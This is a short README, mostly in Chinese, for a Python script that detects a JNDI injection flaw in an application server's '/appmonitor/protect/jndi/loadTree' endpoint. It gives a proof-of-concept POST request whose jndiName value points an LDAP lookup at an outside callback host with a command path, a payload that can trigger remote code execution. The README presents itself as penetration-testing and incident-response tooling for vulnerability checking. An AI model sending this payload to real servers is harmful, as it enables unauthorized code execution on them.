# Python_loadTree_JNDI_script
# JNDI 注入自动化检测脚本 (jndi_inject_detect)

<p align="left">
  <img src="https://img.shields.io/badge/Stage-Exploit-red.svg" alt="Stage">
  <img src="https://img.shields.io/badge/Language-Python%203-blue.svg" alt="Language">
  <img src="https://img.shields.io/badge/Vuln-JNDI%20Injection-orange.svg" alt="Vuln">
</p>

> 渗透项目 / 渗透工具 / 应急脚本

---

## 🔍 漏洞详情与原理

### 1. 漏洞概述
系统中的 `/appmonitor/protect/jndi/loadTree` 接口存在高危 JNDI 注入缺陷，可以通过传入恶意的 LDAP / RMI 地址实现远程代码执行或资源加载。

### 2. 漏洞证明 (POC)
漏洞通过 POST 请求触发，参数 `jndiName` 未经过过滤直接传入底层 JNDI Lookup 方法，可以通过 DNSLog 解析来确证漏洞存在：

http:

    POST /appmonitor/protect/jndi/loadTree HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    jndiName=ldap://{{interactsh-url}}/Basic/Command/calc
    Due to improper permission checks on the app server, attackers can trigger JNDI injection via the "loadTree" interface to achieve RCE (requires lower JDK versions). Legacy vuln, patched in August. EAS is also affected with a different path.

**应用服务器权限验证不当，导致攻击者可以向loadTree接口执行JNDI注入，造成远程代码执行漏洞。利用该漏洞需低版本JDK。（漏洞比较旧，8月份补丁已出，**EAS也存在类似漏洞，只是路径不一样）
